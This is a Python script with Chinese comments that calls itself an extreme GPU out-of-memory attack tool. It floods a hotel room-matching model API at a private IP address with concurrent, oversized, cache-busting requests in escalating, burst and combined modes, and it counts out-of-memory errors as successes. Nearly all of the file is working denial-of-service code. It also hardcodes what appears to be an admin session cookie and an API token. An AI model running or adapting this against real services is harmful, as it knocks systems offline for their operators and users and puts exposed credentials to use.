#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import signal
import sys

# ===== 极限攻击配置 =====
CONFIG = {
    # API配置
    "API_URL": "http://10.0.0.110:13009/match/",
    "MODEL": "cross_entropy_result1_nosplct",
    "TOKEN": "tourmind_room_match",
    "COOKIE": "admintools_user_session=MTc0MjIwMjI3OHw5bzlBTUp3VHBUNjk3OTJlU0xfSnVwanVfM05haTZZaDhWUUxMeDRMNXNIQ1ZPcmdYVW41ZzZ2d0J0VTdXSzZVRUVnY0RSZ09VN0k9fDI5N-SfNq50abl6wb9cLn0lzTqhq9Fq8l_L-jkQ4OKN",

    # 极限攻击配置 - 以并发为主攻击手段
    "MAX_ARRAY_SIZE": 1000,  # 中等数组大小
    "WAVE_SIZES": [500, 700, 800, 900, 1000],  # 逐渐增大的攻击波次
    "MAX_CONCURRENT": 10,  # 极高并发数
    "ATTACK_ROUNDS": 30,  # 增加攻击轮数
    "NO_DELAY": True,  # 无延迟模式
    "CONCURRENT_MULTIPLIER": 3,  # 并发倍数

    # 复杂文本 - 更长的文本增加模型处理负担
    "COMPLEX_ROOMS": [
        "Exclusive Presidential Executive VIP Luxury Grand Master Suite with Panoramic Ocean View Private Terrace Jacuzzi Full Kitchen Living Room Dining Area Work Station Entertainment System Smart Home Technology Concierge Services Butler Available 24-Hour Room Service Late Check-In After Midnight Continental Breakfast Included High-Speed Wireless Internet Access Premium Cable Television Channels Complimentary Minibar Refreshments Daily Housekeeping Services Airport Limousine Transfer Business Center Access Fitness Center Swimming Pool Spa Services Conference Room Facilities Meeting Room Reservations Special Occasion Packages Honeymoon Romance Package Anniversary Celebration Wedding Suite Corporate Events Business Meetings",
    ] * 10  # 重复50次增加复杂度
}

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# 攻击统计
attack_stats = {
    "total_requests": 0,
    "success_requests": 0,
    "failed_requests": 0,
    "oom_detected": 0,
    "timeout_errors": 0,
    "connection_errors": 0,
    "start_time": None,
    "attack_active": True
}

stop_attack = threading.Event()


def signal_handler(signum, frame):
    """优雅停止攻击"""
    logger.info("收到停止信号，正在停止攻击...")
    stop_attack.set()
    attack_stats["attack_active"] = False


def create_extreme_payload(array_size):
    """创建极限攻击载荷"""
    # 使用复杂的长文本
    complex_rooms = CONFIG["COMPLEX_ROOMS"]

    # 扩展到指定大小
    spl_rooms = []
    s_rooms = []

    for i in range(array_size):
        room_idx = i % len(complex_rooms)
        # 添加序号使每个文本都略有不同，避免缓存
        spl_rooms.append(f"{complex_rooms[room_idx]} Request-{i}")
        s_rooms.append(f"{complex_rooms[room_idx]} Target-{i}")

    payload = {
        "spl_room_names": spl_rooms,
        "spl_room_bed_names": [""] * array_size,
        "s_room_names": s_rooms,
        "s_room_bed_names": [""] * array_size,
        "model": CONFIG["MODEL"],
        "token": CONFIG["TOKEN"]
    }

    return payload


def launch_attack_request(request_id, array_size, session=None):
    """发起单次攻击请求"""
    if stop_attack.is_set():
        return {"status": "stopped", "request_id": request_id}

    if session is None:
        session = requests

    headers = {
        'Cookie': CONFIG["COOKIE"],
        'cookie': CONFIG["COOKIE"],
        'User-Agent': f'Extreme OOM Attack/1.0.0 - ID:{request_id}',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Host': '10.0.0.110:13009',
        'Connection': 'keep-alive'
    }

    try:
        payload = create_extreme_payload(array_size)
        start_time = time.time()

        logger.info(f"🚀 发射攻击请求 {request_id}，数组大小: {array_size}")

        response = session.post(
            CONFIG["API_URL"],
            headers=headers,
            json=payload,
            timeout=600  # 10分钟超时
        )

        end_time = time.time()
        response_time = end_time - start_time

        if response.status_code == 200:
            result = response.json()
            attack_stats["success_requests"] += 1
            logger.info(f"✅ 请求 {request_id} 成功，耗时: {response_time:.2f}秒")
            return {
                "status": "success",
                "request_id": request_id,
                "array_size": array_size,
                "response_time": response_time,
                "result": result
            }
        else:
            attack_stats["failed_requests"] += 1
            error_text = response.text

            # 检查显存溢出关键词
            oom_keywords = ["out of memory", "cuda",
                            "memory", "oom", "insufficient", "allocation"]
            if any(keyword in error_text.lower() for keyword in oom_keywords):
                attack_stats["oom_detected"] += 1
                logger.error(
                    f"💥 请求 {request_id} 触发显存溢出! 状态码: {response.status_code}")
                logger.error(f"错误详情: {error_text}")
                return {
                    "status": "oom_success",
                    "request_id": request_id,
                    "array_size": array_size,
                    "error": error_text
                }
            else:
                logger.warning(
                    f"❌ 请求 {request_id} 失败，状态码: {response.status_code}")
                return {
                    "status": "http_error",
                    "request_id": request_id,
                    "status_code": response.status_code,
                    "error": error_text
                }

    except requests.exceptions.Timeout:
        attack_stats["timeout_errors"] += 1
        attack_stats["failed_requests"] += 1
        logger.warning(f"⏰ 请求 {request_id} 超时")
        return {"status": "timeout", "request_id": request_id}

    except requests.exceptions.ConnectionError as e:
        attack_stats["connection_errors"] += 1
        attack_stats["failed_requests"] += 1
        logger.warning(f"🔗 请求 {request_id} 连接错误: {e}")
        return {"status": "connection_error", "request_id": request_id, "error": str(e)}

    except Exception as e:
        attack_stats["failed_requests"] += 1
        logger.error(f"💀 请求 {request_id} 未知错误: {e}")
        return {"status": "unknown_error", "request_id": request_id, "error": str(e)}


def wave_attack(wave_num, array_size, concurrent_count):
    """波次攻击 - 在短时间内发送大量并发请求"""
    # 计算实际并发数（乘以倍数）
    actual_concurrent = concurrent_count * CONFIG["CONCURRENT_MULTIPLIER"]
    actual_requests = actual_concurrent * 2  # 每波发送双倍请求

    logger.info(
        f"🌊 开始第 {wave_num} 波攻击，数组大小: {array_size}，并发数: {actual_concurrent}，总请求数: {actual_requests}")

    results = []

    with ThreadPoolExecutor(max_workers=actual_concurrent) as executor:
        # 为每个线程创建session
        sessions = [requests.Session() for _ in range(
            min(actual_concurrent, 50))]  # 限制session数量

        futures = []

        # 快速提交大量并发请求
        for i in range(actual_requests):
            if stop_attack.is_set():
                break

            session = sessions[i % len(sessions)]
            request_id = f"wave{wave_num}-{i+1}"

            future = executor.submit(
                launch_attack_request,
                request_id,
                array_size,
                session
            )
            futures.append(future)
            attack_stats["total_requests"] += 1

            # 极短间隔或无间隔
            if not CONFIG["NO_DELAY"]:
                time.sleep(0.0001)  # 更短的间隔

        # 收集结果
        completed_count = 0
        for future in as_completed(futures):
            if stop_attack.is_set():
                break
            try:
                result = future.result()
                results.append(result)
                completed_count += 1

                # 检查是否触发显存溢出
                if result.get("status") == "oom_success":
                    logger.error(f"🎯 波次 {wave_num} 成功触发显存溢出！")

                # 每完成50个请求报告一次进度
                if completed_count % 50 == 0:
                    logger.info(
                        f"波次 {wave_num} 已完成 {completed_count}/{len(futures)} 个请求")

            except Exception as e:
                logger.error(f"获取波次 {wave_num} 结果时出错: {e}")

        # 清理session
        for session in sessions:
            try:
                session.close()
            except:
                pass

    return results


def escalating_attack():
    """递增式攻击 - 逐渐增大数组大小和并发数"""
    logger.info("🚀 开始递增式显存溢出攻击")

    attack_stats["start_time"] = time.time()

    all_results = []

    for round_num in range(1, CONFIG["ATTACK_ROUNDS"] + 1):
        if stop_attack.is_set():
            logger.info("收到停止信号，终止攻击")
            break

        # 计算本轮参数
        wave_idx = (round_num - 1) % len(CONFIG["WAVE_SIZES"])
        array_size = CONFIG["WAVE_SIZES"][wave_idx]

        # 激进增加并发数
        concurrent_count = min(10 + round_num * 5, CONFIG["MAX_CONCURRENT"])

        logger.info(f"📈 第 {round_num}/{CONFIG['ATTACK_ROUNDS']} 轮攻击")

        # 执行波次攻击
        wave_results = wave_attack(round_num, array_size, concurrent_count)
        all_results.extend(wave_results)

        # 检查是否已经触发显存溢出
        if attack_stats["oom_detected"] > 0:
            logger.info(
                f"🎯 已成功触发 {attack_stats['oom_detected']} 次显存溢出，继续攻击以验证")

        # 轮次间极短休息
        if round_num < CONFIG["ATTACK_ROUNDS"] and not stop_attack.is_set():
            time.sleep(0.1)

    return all_results


def burst_overload_attack():
    """突发过载攻击 - 瞬间最大压力"""
    logger.info("💥 开始突发过载攻击")

    max_size = CONFIG["MAX_ARRAY_SIZE"]
    max_concurrent = CONFIG["MAX_CONCURRENT"]

    logger.info(f"⚡ 突发攻击配置: 数组大小={max_size}, 并发数={max_concurrent}")

    with ThreadPoolExecutor(max_workers=max_concurrent) as executor:
        futures = []

        # 一次性提交所有最大负载请求
        # 多倍请求量
        for i in range(max_concurrent * CONFIG["CONCURRENT_MULTIPLIER"]):
            if stop_attack.is_set():
                break

            request_id = f"burst-{i+1}"

            future = executor.submit(
                launch_attack_request,
                request_id,
                max_size,
                requests  # 使用默认session
            )
            futures.append(future)
            attack_stats["total_requests"] += 1

        # 立即收集所有结果
        results = []
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)

                if result.get("status") == "oom_success":
                    logger.error(f"💥 突发攻击成功触发显存溢出！")

            except Exception as e:
                logger.error(f"突发攻击获取结果出错: {e}")

    return results


def extreme_concurrent_attack():
    """极限并发攻击 - 专注于并发压力"""
    logger.info("🚀 开始极限并发攻击")

    # 使用较小的数组大小，但极高的并发数
    array_size = 5000  # 更小的数组
    extreme_concurrent = CONFIG["MAX_CONCURRENT"] * 2  # 双倍并发
    total_requests = extreme_concurrent * 5  # 5倍请求量

    logger.info(
        f"⚡ 极限并发配置: 数组大小={array_size}, 并发数={extreme_concurrent}, 总请求数={total_requests}")

    with ThreadPoolExecutor(max_workers=extreme_concurrent) as executor:
        # 创建大量session
        sessions = [requests.Session()
                    for _ in range(min(extreme_concurrent, 100))]

        futures = []

        # 快速提交大量并发请求
        for i in range(total_requests):
            if stop_attack.is_set():
                break

            session = sessions[i % len(sessions)]
            request_id = f"extreme-{i+1}"

            future = executor.submit(
                launch_attack_request,
                request_id,
                array_size,
                session
            )
            futures.append(future)
            attack_stats["total_requests"] += 1

            # 无延迟快速提交
            if i % 100 == 0:
                logger.info(f"已提交 {i+1}/{total_requests} 个请求")

        # 收集结果
        results = []
        completed = 0
        for future in as_completed(futures):
            if stop_attack.is_set():
                break
            try:
                result = future.result()
                results.append(result)
                completed += 1

                if result.get("status") == "oom_success":
                    logger.error(f"🎯 极限并发攻击成功触发显存溢出！")

                # 进度报告
                if completed % 200 == 0:
                    logger.info(f"极限并发攻击已完成 {completed}/{len(futures)} 个请求")

            except Exception as e:
                logger.error(f"极限并发攻击获取结果出错: {e}")

        # 清理session
        for session in sessions:
            try:
                session.close()
            except:
                pass

    return results


def print_attack_summary():
    """打印攻击总结"""
    if attack_stats["start_time"]:
        elapsed = time.time() - attack_stats["start_time"]
        success_rate = (attack_stats["success_requests"] / attack_stats["total_requests"]
                        * 100) if attack_stats["total_requests"] > 0 else 0

        print("\n" + "🎯" + "="*58 + "🎯")
        print("🚀 极限显存溢出攻击战报 🚀")
        print("🎯" + "="*58 + "🎯")
        print(f"📊 总发射请求数: {attack_stats['total_requests']}")
        print(f"✅ 成功请求数: {attack_stats['success_requests']}")
        print(f"❌ 失败请求数: {attack_stats['failed_requests']}")
        print(f"💥 显存溢出次数: {attack_stats['oom_detected']}")
        print(f"⏰ 超时错误: {attack_stats['timeout_errors']}")
        print(f"🔗 连接错误: {attack_stats['connection_errors']}")
        print(f"📈 成功率: {success_rate:.2f}%")
        print(f"⏱️  总攻击时间: {elapsed:.2f}秒")
        print(
            f"🚀 平均RPS: {attack_stats['total_requests']/elapsed:.2f}" if elapsed > 0 else "🚀 平均RPS: N/A")

        if attack_stats['oom_detected'] > 0:
            print(
                f"\n🎉 🎉 🎉 攻击成功！触发了 {attack_stats['oom_detected']} 次显存溢出！🎉 🎉 🎉")
        else:
            print(f"\n😞 未能触发显存溢出，可能需要更激进的参数")

        print("🎯" + "="*58 + "🎯")


def main():
    """主函数"""
    # 设置信号处理
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print("💀 极限显存溢出攻击工具 💀")
    print("🎯" + "="*58 + "🎯")
    print(f"🎯 目标API: {CONFIG['API_URL']}")
    print(f"💥 最大数组大小: {CONFIG['MAX_ARRAY_SIZE']}")
    print(f"⚡ 最大并发数: {CONFIG['MAX_CONCURRENT']}")
    print(f"🌊 攻击轮数: {CONFIG['ATTACK_ROUNDS']}")
    print(f"🚀 无延迟模式: {CONFIG['NO_DELAY']}")
    print("🎯" + "="*58 + "🎯")

    mode = input(
        "选择攻击模式:\n1. 递增攻击 (escalating)\n2. 突发攻击 (burst)\n3. 极限并发攻击 (extreme)\n4. 混合攻击 (combined)\n请选择 (1/2/3/4): ").strip()

    try:
        if mode == "1":
            logger.info("🚀 选择递增攻击模式")
            escalating_attack()
        elif mode == "2":
            logger.info("💥 选择突发攻击模式")
            burst_overload_attack()
        elif mode == "3":
            logger.info("⚡ 选择极限并发攻击模式")
            extreme_concurrent_attack()
        elif mode == "4":
            logger.info("🔥 选择混合攻击模式")
            # 先极限并发攻击
            extreme_concurrent_attack()
            if not stop_attack.is_set() and attack_stats["oom_detected"] == 0:
                logger.info("极限并发攻击未成功，切换到突发攻击")
                time.sleep(1)
                burst_overload_attack()
            if not stop_attack.is_set() and attack_stats["oom_detected"] == 0:
                logger.info("突发攻击未成功，切换到递增攻击")
                time.sleep(1)
                escalating_attack()
        else:
            logger.info("🔥 默认执行极限并发攻击")
            extreme_concurrent_attack()

    except KeyboardInterrupt:
        logger.info("收到中断信号，停止攻击")
    except Exception as e:
        logger.error(f"攻击执行出错: {e}")
    finally:
        attack_stats["attack_active"] = False
        print_attack_summary()


if __name__ == "__main__":
    main()
